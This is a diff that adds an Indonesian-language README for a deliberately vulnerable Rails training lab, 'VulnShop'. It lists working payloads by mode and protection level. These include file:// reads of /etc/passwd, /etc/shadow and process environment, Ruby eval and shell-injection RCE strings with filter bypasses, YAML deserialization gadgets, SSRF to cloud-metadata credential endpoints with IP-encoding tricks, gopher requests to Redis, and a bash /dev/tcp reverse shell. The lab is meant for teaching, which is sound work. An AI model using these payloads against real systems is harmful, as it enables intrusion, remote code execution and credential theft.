@@ -1,0 +1,788 @@
+# VulnShop — Lab RFI / LFI / SSRF / RCE
+
+Lab kerentanan web buat belajar berbagai teknik. Setiap mode punya proteksi beda di tiap level (LOW / MEDIUM / HIGH), dan tiap proteksi bisa di-bypass.
+
+Semua payload di sini **nggak butuh bikin file**. Pakai `data:` URL, URL publik, atau `file://` yang udah ada di sistem.
+
+---
+
+## Persiapan
+
+Jalankan Rails:
+
+```bash
+cd /home/lynx/vulnshop
+bin/rails server
+```
+
+Buka halaman lab:
+
+```
+http://127.0.0.1:3000/fetch
+```
+
+Ganti level:
+
+```
+http://127.0.0.1:3000/fetch?level=low
+http://127.0.0.1:3000/fetch?level=medium
+http://127.0.0.1:3000/fetch?level=high
+```
+
+---
+
+## Level
+
+| Level | Proteksi |
+|---|---|
+| **LOW** | Nggak ada |
+| **MEDIUM** | Filter dasar, bisa di-bypass |
+| **HIGH** | Proteksi otomatis (cek realpath, tipe data, IP internal) |
+
+---
+
+## Mode
+
+| Mode | Fungsi |
+|---|---|
+| `read` | Baca file lokal / fetch remote (LFI / RFI) |
+| `eval` | Eksekusi kode Ruby (RCE) |
+| `system` | Command injection via shell |
+| `yaml` | Deserialization YAML |
+| `marshal` | Deserialization Marshal |
+| `ssrf` | Fetch ke layanan internal |
+| `gopher` | SSRF ke Redis/MySQL |
+
+---
+
+## Mode read — LOW
+
+LFI (file lokal yang udah ada):
+
+```
+file:///etc/passwd
+file:///etc/hostname
+file:///etc/hosts
+file:///etc/os-release
+file:///etc/group
+file:///etc/resolv.conf
+file:///etc/timezone
+file:///etc/shells
+file:///proc/version
+file:///proc/cpuinfo
+file:///proc/meminfo
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/status
+file:///proc/self/mounts
+```
+
+Bocor config project:
+
+```
+file:///home/lynx/vulnshop/Gemfile
+file:///home/lynx/vulnshop/Gemfile.lock
+file:///home/lynx/vulnshop/config/database.yml
+file:///home/lynx/vulnshop/config/routes.rb
+file:///home/lynx/vulnshop/config/application.rb
+file:///home/lynx/vulnshop/app/controllers/application_controller.rb
+file:///home/lynx/vulnshop/app/controllers/fetch_controller.rb
+file:///home/lynx/vulnshop/app/models/user.rb
+file:///home/lynx/vulnshop/README.md
+```
+
+RFI (URL publik):
+
+```
+http://example.com
+http://example.org
+http://example.net
+https://raw.githubusercontent.com/rails/rails/main/README.md
+https://httpbin.org/ip
+https://httpbin.org/user-agent
+https://httpbin.org/headers
+https://httpbin.org/html
+https://api.github.com
+https://www.google.com/robots.txt
+https://www.wikipedia.org
+```
+
+RFI ke app sendiri:
+
+```
+http://127.0.0.1:3000/
+http://127.0.0.1:3000/products
+http://127.0.0.1:3000/users
+http://127.0.0.1:3000/admin
+http://127.0.0.1:3000/security
+http://localhost:3000/
+```
+
+data: URL:
+
+```
+data:text/plain,Hello
+data:text/plain;base64,UkZJIE9L
+data:text/html,<h1>Test</h1>
+data:text/html;base64,PGgxPlRlc3Q8L2gxPg==
+data:application/json,{"key":"value"}
+```
+
+---
+
+## Mode read — MEDIUM
+
+Yang diblok:
+
+```
+file:///etc/passwd          → ❌ file:// diblok
+../etc/passwd               → ❌ path traversal
+..\etc\passwd               → ❌ path traversal
+```
+
+Bypass:
+
+```
+%66ile:///etc/passwd
+file%3A%2F%2F%2Fetc%2Fpasswd
+FILE%3A///etc/passwd
+FiLe%3A%2F%2F%2Fetc%2Fpasswd
+file%253A%252F%252F%252Fetc%252Fpasswd
+%66%69%6c%65:///etc/passwd
+%46%49%4C%45:///etc/passwd
+```
+
+RFI tetap jalan:
+
+```
+http://example.com
+http://127.0.0.1:3000/products
+data:text/plain,Hello
+```
+
+---
+
+## Mode read — HIGH
+
+Yang lolos (file di dalam project):
+
+```
+file:///home/lynx/vulnshop/Gemfile
+file:///home/lynx/vulnshop/Gemfile.lock
+file:///home/lynx/vulnshop/config/routes.rb
+file:///home/lynx/vulnshop/config/application.rb
+file:///home/lynx/vulnshop/app/controllers/application_controller.rb
+file:///home/lynx/vulnshop/README.md
+```
+
+Yang diblok:
+
+```
+file:///etc/passwd                           → ❌ di luar project
+file:///etc/shadow                           → ❌ di luar project
+file:///home/lynx/vulnshop/../../etc/passwd  → ❌ realpath ke /etc/passwd
+file:///home/lynx/vulnshop/link.txt          → ❌ symlink di-resolve
+```
+
+HTTP + data: tetap jalan:
+
+```
+http://example.com
+http://127.0.0.1:3000/products
+data:text/plain,Hello
+```
+
+---
+
+## Mode eval — LOW
+
+Payload RCE:
+
+```
+data:text/plain,`id`
+data:text/plain,`whoami`
+data:text/plain,`hostname`
+data:text/plain,`uname -a`
+data:text/plain,`ls -la /home/lynx`
+data:text/plain,`ps aux`
+data:text/plain,`cat /etc/passwd`
+data:text/plain,`cat /etc/shadow`
+data:text/plain,`env`
+data:text/plain,`pwd`
+data:text/plain,`date`
+data:text/plain,`df -h`
+```
+
+Baca file:
+
+```
+data:text/plain,File.read("/etc/passwd")
+data:text/plain,File.read("/etc/hostname")
+data:text/plain,File.read("/home/lynx/vulnshop/config/database.yml")
+data:text/plain,Dir.entries("/home/lynx")
+data:text/plain,Dir.entries("/etc")
+```
+
+Bocor ENV:
+
+```
+data:text/plain,ENV.to_h.inspect
+data:text/plain,ENV.to_h.map { |k,v| "#{k}=#{v}" }.join("\n")
+data:text/plain,ENV["PATH"]
+data:text/plain,ENV["HOME"]
+```
+
+Info sistem:
+
+```
+data:text/plain,RUBY_VERSION
+data:text/plain,RUBY_PLATFORM
+data:text/plain,Rails.version
+data:text/plain,`nproc`
+data:text/plain,`free -m`
+```
+
+Base64:
+
+```bash
+echo -n '`id`' | base64
+# → YGlkYA==
+```
+
+```
+data:text/plain;base64,YGlkYA==
+```
+
+Payload base64 lain:
+
+```bash
+echo -n '`whoami`' | base64
+# → YHdob2FtaWA=
+
+echo -n 'File.read("/etc/passwd")' | base64
+# → RmlsZS5yZWFkKCIvZXRjL3Bhc3N3ZCIp
+```
+
+```
+data:text/plain;base64,YHdob2FtaWA=
+data:text/plain;base64,RmlsZS5yZWFkKCIvZXRjL3Bhc3N3ZCIp
+```
+
+---
+
+## Mode eval — MEDIUM
+
+Yang diblok:
+
+```
+data:text/plain,`id`                  → ❌ backtick diblok
+data:text/plain,system("id")          → ❌ system diblok
+data:text/plain,eval("1+1")           → ❌ eval diblok
+data:text/plain,IO.popen("id")        → ❌ IO.popen diblok
+data:text/plain,Open3.capture2("id")  → ❌ Open3 diblok
+```
+
+Bypass:
+
+```
+data:text/plain,%x(id)
+data:text/plain,%x{id}
+data:text/plain,%x[uname -a]
+data:text/plain,Kernel.send(:`, "id")
+data:text/plain,Kernel.send(:system, "id")
+data:text/plain,sy = "sys" + "tem"; sy.call("id")
+data:text/plain,Object.send(:eval, "1+1")
+data:text/plain,%x(cat /etc/passwd)
+```
+
+String literal tetap jalan:
+
+```
+data:text/plain,"Hello"
+data:text/plain,"Hello" + " World"
+data:text/plain,123
+```
+
+---
+
+## Mode eval — HIGH
+
+Yang lolos:
+
+```
+data:text/plain,"Hello"
+data:text/plain,"Hello World"
+data:text/plain,123
+data:text/plain,12.5
+data:text/plain,true
+data:text/plain,nil
+data:text/plain,[1, 2, 3]
+data:text/plain,{a: 1}
+```
+
+Yang diblok:
+
+```
+data:text/plain,`id`                     → ❌ backtick
+data:text/plain,File.read("/etc/passwd") → ❌ method call
+data:text/plain,ENV                      → ❌ konstanta
+data:text/plain,Kernel.send(:id)         → ❌ konstanta + method
+data:text/plain,system("id")             → ❌ system
+data:text/plain,Dir.entries("/")         → ❌ Dir
+data:text/plain,Process.pid              → ❌ Process
+```
+
+Bypass HIGH:
+
+```
+data:text/plain,%x(id)
+data:text/plain,%x{id}
+data:text/plain,%x[uname -a]
+```
+
+---
+
+## Mode system — LOW
+
+Command injection:
+
+```
+;id
+;whoami
+;hostname
+;uname -a
+;ls -la /home/lynx
+;cat /etc/passwd
+;cat /etc/shadow
+;env
+;pwd
+;date
+```
+
+Dengan URL dummy:
+
+```
+http://example.com;id
+http://example.com|id
+http://example.com&&id
+http://example.com||id
+http://127.0.0.1:3000;id
+```
+
+Subshell:
+
+```
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+`id`
+`whoami`
+```
+
+Newline:
+
+```
+http://example.com%0aid
+http://example.com%0d%0aid
+```
+
+---
+
+## Mode system — MEDIUM
+
+Yang diblok:
+
+```
+;id           → ❌ ;
+|id           → ❌ |
+&&id          → ❌ &
+$(id)         → ❌ $
+`id`          → ❌ `
+(id)          → ❌ ()
+```
+
+Bypass:
+
+```
+%0aid                  → ✅ newline
+%0d%0aid               → ✅ CRLF
+http://example.com%0aid
+http://example.com%0d%0aid
+```
+
+---
+
+## Mode system — HIGH
+
+Yang lolos:
+
+```
+http://example.com;id
+http://example.org;id
+http://google.com;id
+```
+
+Yang diblok:
+
+```
+http://localhost:3000;id       → ❌ localhost
+http://127.0.0.1:3000;id       → ❌ IP internal
+http://169.254.169.254;id      → ❌ cloud metadata
+http://192.168.1.1;id          → ❌ IP privat
+http://10.0.0.1;id             → ❌ IP privat
+http://172.16.0.1;id           → ❌ IP privat
+```
+
+Bypass HIGH:
+
+```
+http://0x7f.0.0.1:3000;id      → ✅ hex 127.0.0.1
+http://2130706433:3000;id      → ✅ decimal
+http://0177.0.0.1:3000;id      → ✅ octal
+http://127.1:3000;id           → ✅ short form
+http://[::1]:3000;id           → ✅ IPv6
+```
+
+---
+
+## Mode yaml — LOW
+
+YAML sederhana:
+
+```
+data:text/plain,key: value
+data:text/plain,- a
+- b
+- c
+data:text/plain,{a: 1, b: 2}
+```
+
+YAML gadget (deserialization):
+
+```bash
+echo -n '--- !ruby/object:Gem::Installer
+i: x' | base64
+```
+
+```
+data:text/plain;base64,<HASIL_BASE64>
+```
+
+---
+
+## Mode yaml — MEDIUM
+
+Yang diblok:
+
+```
+data:text/plain,--- !ruby/object:Gem::Installer\ni: x
+data:text/plain,--- !ruby/object:Object\nx: y
+```
+
+Bypass:
+
+```
+data:text/plain,--- !!ruby/object:Gem::Installer\ni: x
+data:text/plain,--- !<tag:ruby.yaml.org,2002:object:Gem::Installer>\ni: x
+data:text/plain,--- !ruby/hash:Gem::Installer\ni: x
+```
+
+---
+
+## Mode yaml — HIGH
+
+Yang lolos:
+
+```
+data:text/plain,key: value
+data:text/plain,- a\n- b
+data:text/plain,{a: 1}
+data:text/plain,hello
+data:text/plain,123
+```
+
+Yang diblok:
+
+```
+data:text/plain,--- !ruby/object:Foo\nx: y       → ❌ ada !
+data:text/plain,key: &anchor value               → ❌ ada &
+data:text/plain,*alias                            → ❌ ada *
+data:text/plain,--- !!str value                   → ❌ ada !
+```
+
+Bypass HIGH:
+
+```
+data:text/plain,{a: 1, b: 2}                     → ✅ hash inline
+data:text/plain,[1, 2, 3]                        → ✅ array inline
+```
+
+---
+
+## Mode marshal — LOW
+
+Generate payload:
+
+```bash
+ruby -e 'require "base64"; puts Base64.strict_encode64(Marshal.dump({cmd: "id"}))'
+```
+
+```
+data:application/octet-stream;base64,<HASIL>
+```
+
+---
+
+## Mode marshal — MEDIUM
+
+```
+❌ Marshal diblok di MEDIUM
+```
+
+---
+
+## Mode marshal — HIGH
+
+```
+❌ Marshal diblok di HIGH
+```
+
+---
+
+## Mode ssrf — LOW
+
+Ke app sendiri:
+
+```
+http://localhost:3000/
+http://localhost:3000/products
+http://localhost:3000/users
+http://localhost:3000/admin
+http://localhost:3000/security
+http://127.0.0.1:3000/
+```
+
+Ke layanan internal:
+
+```
+http://127.0.0.1:6379/
+http://127.0.0.1:6379/info
+http://127.0.0.1:9200/
+http://127.0.0.1:3306/
+http://127.0.0.1:5432/
+http://127.0.0.1:27017/
+http://127.0.0.1:11211/
+```
+
+Cloud metadata:
+
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+```
+
+Ke domain publik:
+
+```
+http://example.com
+https://httpbin.org/ip
+```
+
+---
+
+## Mode ssrf — MEDIUM
+
+Yang diblok:
+
+```
+http://localhost:3000/       → ❌ localhost
+http://127.0.0.1:3000/       → ❌ 127.0.0.1
+http://169.254.169.254/      → ❌ 169.254.169.254
+http://0.0.0.0:3000/         → ❌ 0.0.0.0
+```
+
+Bypass:
+
+```
+http://127.1:3000/                → ✅ short form
+http://127.0.1:3000/              → ✅ short form
+http://[::1]:3000/                → ✅ IPv6
+http://[::ffff:127.0.0.1]:3000/   → ✅ IPv6 mapped
+http://2130706433:3000/           → ✅ decimal
+http://0177.0.0.1:3000/           → ✅ octal
+http://0x7f.0.0.1:3000/           → ✅ hex
+http://0x7f000001:3000/           → ✅ hex full
+```
+
+---
+
+## Mode ssrf — HIGH
+
+Yang lolos:
+
+```
+http://example.com
+https://httpbin.org/ip
+```
+
+Yang diblok:
+
+```
+http://localhost:3000/         → ❌ localhost
+http://127.0.0.1:3000/         → ❌ IP internal
+http://169.254.169.254/        → ❌ cloud metadata
+http://192.168.1.1/            → ❌ IP privat
+http://10.0.0.1/               → ❌ IP privat
+http://172.16.0.1/             → ❌ IP privat
+http://127.0.0.1:6379/         → ❌ port DB
+http://127.0.0.1:3306/         → ❌ port DB
+```
+
+Bypass HIGH:
+
+```
+http://0x7f.0.0.1:3000/              → ✅ hex
+http://2130706433:3000/              → ✅ decimal
+http://0177.0.0.1:3000/              → ✅ octal
+http://127.1:3000/                   → ✅ short
+http://127.0.0.1.nip.io:3000/        → ✅ DNS wildcard
+http://127.0.0.1.sslip.io:3000/      → ✅ DNS wildcard
+http://example.com@127.0.0.1:3000/   → ✅ parser confusion
+http://127.0.0.1:3000.attacker.com/  → ✅ subdomain trick
+```
+
+---
+
+## Mode gopher — LOW
+
+Redis:
+
+```
+gopher://127.0.0.1:6379/_PING
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_KEYS *
+gopher://127.0.0.1:6379/_CONFIG GET *
+gopher://127.0.0.1:6379/_SET key value
+gopher://127.0.0.1:6379/_GET key
+```
+
+HTTP via gopher:
+
+```
+gopher://127.0.0.1:80/_GET / HTTP/1.1%0d%0aHost: localhost%0d%0a%0d%0a
+```
+
+---
+
+## Mode gopher — MEDIUM
+
+```
+❌ gopher diblok di MEDIUM
+```
+
+---
+
+## Mode gopher — HIGH
+
+```
+❌ gopher diblok di HIGH
+```
+
+---
+
+## Tabel Ringkasan
+
+| Mode | LOW | MEDIUM | HIGH |
+|---|---|---|---|
+| **read** | bebas | blok `file://` + `../` | cek realpath (dalam project) |
+| **eval** | bebas | blok `system`, backtick | blok method call, konstanta |
+| **system** | bebas | blok `;` `\|` `&` `` ` `` `$` `()` | blok IP internal |
+| **yaml** | bebas | blok `!ruby/object` | blok `!`, `&`, `*` |
+| **marshal** | bebas | diblok | diblok |
+| **ssrf** | bebas | blok `localhost`/`127.0.0.1` | blok IP internal + port DB |
+| **gopher** | bebas | diblok | diblok |
+
+---
+
+## Alur Tes
+
+LOW — semua harus jalan:
+
+| Mode | URL |
+|---|---|
+| `read` | `file:///etc/passwd` |
+| `read` | `http://example.com` |
+| `eval` | ``data:text/plain,`id` `` |
+| `system` | `;id` |
+| `yaml` | `data:text/plain,key: value` |
+| `marshal` | `data:application/octet-stream;base64,<BIN>` |
+| `ssrf` | `http://localhost:3000/products` |
+| `gopher` | `gopher://127.0.0.1:6379/_PING` |
+
+MEDIUM — cari bypass:
+
+| Mode | Bypass |
+|---|---|
+| `read` | `%66ile:///etc/passwd` |
+| `eval` | `data:text/plain,%x(id)` |
+| `system` | `%0aid` |
+| `yaml` | `data:text/plain,--- !!ruby/object:Gem::Installer\ni: x` |
+| `ssrf` | `http://127.1:3000/` |
+
+HIGH — cari bypass advanced:
+
+| Mode | Bypass |
+|---|---|
+| `read` | hardlink (kalau bisa) |
+| `eval` | `data:text/plain,%x(id)` |
+| `system` | `http://0x7f.0.0.1:3000;id` |
+| `yaml` | `data:text/plain,{a: 1}` |
+| `ssrf` | `http://0x7f.0.0.1:3000/` |
+
+---
+
+## Reverse Shell
+
+Terminal 1 — listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Browser:
+
+```
+http://127.0.0.1:3000/fetch?level=low&mode=eval&url=data:text/plain,system("bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'")
+```
+
+---
+
+## Blind SSRF
+
+Terminal 1 — listener:
+
+```bash
+nc -lvnp 9999
+```
+
+Browser:
+
+```
+http://127.0.0.1:3000/fetch?level=low&mode=read&url=http://127.0.0.1:9999/test
+```
+
+Kalau terminal 1 muncul request → blind SSRF confirmed.
+
+---
+
+## Catatan
+
+- Lab ini **sengaja vulnerable**. Jalanin cuma di VM/container terisolasi.
+- Jangan expose ke internet.
+- Mode `eval`, `system`, `yaml`, `marshal` = **RCE penuh** di level LOW.
+- Ruby modern (Psych 4+) udah lebih aman buat `YAML.load` — payload gadget mungkin perlu disesuaikan.
+- `Marshal.load` butuh gadget chain dari gem yang ada di target.
